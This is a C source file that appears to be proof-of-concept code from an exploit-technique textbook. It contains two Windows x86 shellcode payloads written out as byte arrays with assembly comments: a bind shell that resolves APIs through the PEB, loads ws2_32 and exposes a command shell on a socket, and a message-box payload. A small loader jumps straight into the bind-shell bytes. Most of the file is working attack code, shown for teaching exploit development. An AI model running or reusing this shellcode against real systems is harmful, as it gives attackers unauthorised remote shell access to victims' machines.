/*****************************************************************************
      To be the apostrophe which changed "Impossible" into "I'm possible"!
		
POC code of chapter 3.4 in book "Vulnerability Exploit and Analysis Technique"
 
file name	: shellcode_loader.c
author		: failwest  
date		: 2006.11.11
description	: used to test shellcode 
Noticed		: 
version		: 1.0
E-mail		: failwest@gmail.com
		
	Only for educational purposes    enjoy the fun from exploiting :)
******************************************************************************/


char bindshell[]=
"\x59"//            POP ECX
"\x81\xC9\xD3\x62\x30\x20"//  OR ECX,203062D3
"\x41"//             INC ECX
"\x43"//             INC EBX
"\x4D"//             DEC EBP
"\x64\x99"//          CDQ                                      ;  Superfluous prefix
"\x96"//             XCHG EAX,ESI
"\x8D\x7E\xE8"//        LEA EDI,DWORD PTR DS:[ESI-18]
"\x64\x8B\x5A\x30"//     MOV EBX,DWORD PTR FS:[EDX+30]
"\x8B\x4B\x0C"//        MOV ECX,DWORD PTR DS:[EBX+C]
"\x8B\x49\x1C"//        MOV ECX,DWORD PTR DS:[ECX+1C]
"\x8B\x09"//           MOV ECX,DWORD PTR DS:[ECX]
"\x8B\x69\x08"//        MOV EBP,DWORD PTR DS:[ECX+8]
"\xB6\x03"//          MOV DH,3
"\x2B\xE2"//           SUB ESP,EDX
"\x66\xBA\x33\x32"//     MOV DX,3233
"\x52"//             PUSH EDX
"\x68\x77\x73\x32\x5F"//     PUSH 5F327377
"\x54"//             PUSH ESP
"\xAC"//             LODS BYTE PTR DS:[ESI]
"\x3C\xD3"//           CMP AL,0D3
"\x75\x06"//           JNZ SHORT bindshel.00401076
"\x95"//             XCHG EAX,EBP
"\xFF\x57\xF4"//        CALL DWORD PTR DS:[EDI-C]
"\x95"//             XCHG EAX,EBP
"\x57"//             PUSH EDI
"\x60"//             PUSHAD
"\x8B\x45\x3C"//        MOV EAX,DWORD PTR SS:[EBP+3C]
"\x8B\x4C\x05\x78"//      MOV ECX,DWORD PTR SS:[EBP+EAX+78]
"\x03\xCD"//           ADD ECX,EBP
"\x8B\x59\x20"//        MOV EBX,DWORD PTR DS:[ECX+20]
"\x03\xDD"//           ADD EBX,EBP
"\x33\xFF"//           XOR EDI,EDI
"\x47"//             INC EDI
"\x8B\x34\xBB"//         MOV ESI,DWORD PTR DS:[EBX+EDI*4]
"\x03\xF5"//           ADD ESI,EBP
"\x99"//             CDQ
"\xAC"//             LODS BYTE PTR DS:[ESI]
"\x34\x71"//           XOR AL,71
"\x2A\xD0"//           SUB DL,AL
"\x3C\x71"//           CMP AL,71
"\x75\xF7"//           JNZ SHORT bindshel.0040108E
"\x3A\x54\x24\x1C"//      CMP DL,BYTE PTR SS:[ESP+1C]
"\x75\xEA"//           JNZ SHORT bindshel.00401087
"\x8B\x59\x24"//        MOV EBX,DWORD PTR DS:[ECX+24]
"\x03\xDD"//           ADD EBX,EBP
"\x66\x8B\x3C\x7B"//      MOV DI,WORD PTR DS:[EBX+EDI*2]
"\x8B\x59\x1C"//        MOV EBX,DWORD PTR DS:[ECX+1C]
"\x03\xDD"//           ADD EBX,EBP
"\x03\x2C\xBB"//         ADD EBP,DWORD PTR DS:[EBX+EDI*4]
"\x95"//             XCHG EAX,EBP
"\x5F"//             POP EDI
"\xAB"//             STOS DWORD PTR ES:[EDI]
"\x57"//             PUSH EDI
"\x61"//             POPAD
"\x3B\xF7"//           CMP ESI,EDI
"\x75\xB4"//           JNZ SHORT bindshel.0040106B
"\x5E"//             POP ESI
"\x54"//             PUSH ESP
"\x6A\x02"//           PUSH 2
"\xAD"//            LODS DWORD PTR DS:[ESI]
"\xFF\xD0"//          CALL EAX
"\x88\x46\x13"//        MOV BYTE PTR DS:[ESI+13],AL
"\x8D\x48\x30"//        LEA ECX,DWORD PTR DS:[EAX+30]
"\x8B\xFC"//           MOV EDI,ESP
"\xF3\xAB"//          REP STOS DWORD PTR ES:[EDI]
"\x40"//             INC EAX
"\x50"//             PUSH EAX
"\x40"//             INC EAX
"\x50"//             PUSH EAX
"\xAD"//             LODS DWORD PTR DS:[ESI]
"\xFF\xD0"//           CALL EAX
"\x95"//             XCHG EAX,EBP
"\xB8\x02\xFF\x1A\x0A"//     MOV EAX,0A1AFF02
"\x32\xE4"//           XOR AH,AH
"\x50"//             PUSH EAX
"\x54"//             PUSH ESP
"\x55"//             PUSH EBP
"\xAD"//             LODS DWORD PTR DS:[ESI]
"\xFF\xD0"//           CALL EAX
"\x85\xC0"//           TEST EAX,EAX
"\x74\xF8"//           JE SHORT bindshel.004010D9
"\xFE\x44\x24\x2D"//      INC BYTE PTR SS:[ESP+2D]
"\x83\xEF\x6C"//        SUB EDI,6C
"\xAB"//             STOS DWORD PTR ES:[EDI]
"\xAB"//             STOS DWORD PTR ES:[EDI]
"\xAB"//             STOS DWORD PTR ES:[EDI]
"\x58"//             POP EAX
"\x54"//             PUSH ESP
"\x54"//             PUSH ESP
"\x50"//             PUSH EAX
"\x50"//             PUSH EAX
"\x50"//             PUSH EAX
"\x54"//             PUSH ESP
"\x50"//             PUSH EAX
"\x50"//             PUSH EAX
"\x56"//             PUSH ESI
"\x50"//            PUSH EAX
"\xFF\x56\xE4"//        CALL DWORD PTR DS:[ESI-1C]
"\xFF\x56\xE8"//        CALL DWORD PTR DS:[ESI-18]
"\x90"//             NOP
"\x90"//             NOP
"\x90"//             NOP
"\x90"//             NOP
"\x90"//             NOP
"\x90"//             NOP
"\x90"//             NOP
"\x90"//             NOP
"\x90"//             NOP
"\x90"//             NOP
"\x90";//             NOP



/*
char popup_general[]=
"\x90"//						NOP
"\xFC"
"\x68\x6A\x0A\x38\x1E"//		PUSH 1E380A6A
"\x68\x63\x89\xD1\x4F"//		PUSH 4FD18963
"\x68\x32\x74\x91\x0C"//		PUSH 0C917432
"\x8B\xF4"//					MOV ESI,ESP
"\x8D\x7E\xF4"//				LEA EDI,DWORD PTR DS:[ESI-C]
"\x33\xDB"//					XOR EBX,EBX
"\xB7\x04"//					MOV BH,4
"\x2B\xE3"//					SUB ESP,EBX
"\x66\xBB\x33\x32"//			MOV BX,3233
"\x53"//						PUSH EBX
"\x68\x75\x73\x65\x72"//		PUSH 72657375
"\x54"//						PUSH ESP
"\x33\xD2"//					XOR EDX,EDX
"\x64\x8B\x5A\x30"//			MOV EBX,DWORD PTR FS:[EDX+30]
"\x8B\x4B\x0C"//				MOV ECX,DWORD PTR DS:[EBX+C]
"\x8B\x49\x1C"//				MOV ECX,DWORD PTR DS:[ECX+1C]
"\x8B\x09"//					MOV ECX,DWORD PTR DS:[ECX]
"\x8B\x69\x08"//				MOV EBP,DWORD PTR DS:[ECX+8]
"\xAD"//						LODS DWORD PTR DS:[ESI]
"\x3D\x6A\x0A\x38\x1E"//		CMP EAX,1E380A6A
"\x75\x05"//					JNZ SHORT popup_co.00401070
"\x95"//						XCHG EAX,EBP
"\xFF\x57\xF8"//				CALL DWORD PTR DS:[EDI-8]
"\x95"//						XCHG EAX,EBP
"\x60"//						PUSHAD
"\x8B\x45\x3C"//				MOV EAX,DWORD PTR SS:[EBP+3C]
"\x8B\x4C\x05\x78"//			MOV ECX,DWORD PTR SS:[EBP+EAX+78]
"\x03\xCD"//					ADD ECX,EBP
"\x8B\x59\x20"//				MOV EBX,DWORD PTR DS:[ECX+20]
"\x03\xDD"//					ADD EBX,EBP
"\x33\xFF"//					XOR EDI,EDI
"\x47"//						INC EDI
"\x8B\x34\xBB"//				MOV ESI,DWORD PTR DS:[EBX+EDI*4]
"\x03\xF5"//					ADD ESI,EBP
"\x99"//						CDQ
"\x0F\xBE\x06"//				MOVSX EAX,BYTE PTR DS:[ESI]
"\x3A\xC4"//					CMP AL,AH
"\x74\x08"//					JE SHORT popup_co.00401097
"\xC1\xCA\x07"//				ROR EDX,7
"\x03\xD0"//					ADD EDX,EAX
"\x46"//						INC ESI
"\xEB\xF1"//					JMP SHORT popup_co.00401088
"\x3B\x54\x24\x1C"//			CMP EDX,DWORD PTR SS:[ESP+1C]
"\x75\xE4"//					JNZ SHORT popup_co.00401081
"\x8B\x59\x24"//				MOV EBX,DWORD PTR DS:[ECX+24]
"\x03\xDD"//					ADD EBX,EBP
"\x66\x8B\x3C\x7B"//			MOV DI,WORD PTR DS:[EBX+EDI*2]
"\x8B\x59\x1C"//				MOV EBX,DWORD PTR DS:[ECX+1C]
"\x03\xDD"//					ADD EBX,EBP
"\x03\x2C\xBB"//				ADD EBP,DWORD PTR DS:[EBX+EDI*4]
"\x95"//						XCHG EAX,EBP
"\x5F"//						POP EDI
"\xAB"//						STOS DWORD PTR ES:[EDI]
"\x57"//						PUSH EDI
"\x61"//						POPAD
"\x3D\x6A\x0A\x38\x1E"//		CMP EAX,1E380A6A
"\x75\xA9"//					JNZ SHORT popup_co.00401063
"\x33\xDB"//					XOR EBX,EBX
"\x53"//						PUSH EBX
"\x68\x77\x65\x73\x74"//		PUSH 74736577
"\x68\x66\x61\x69\x6C"//		PUSH 6C696166
"\x8B\xC4"//					MOV EAX,ESP
"\x53"//						PUSH EBX
"\x50"//						PUSH EAX
"\x50"//						PUSH EAX
"\x53"//						PUSH EBX
"\xFF\x57\xFC"//				CALL DWORD PTR DS:[EDI-4]
"\x53"//						PUSH EBX
"\xFF\x57\xF8";//				CALL DWORD PTR DS:[EDI-8]
*/



char popup_general[]=
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8";


//可以自定位API的shellcode

void main()
{
	__asm
	{
		lea eax, bindshell
		//lea eax, popup_general
		//lea eax, MachineCode
		//lea eax, MachineCode
		//lea eax, MachineCode
		push		eax
		ret
	}
}
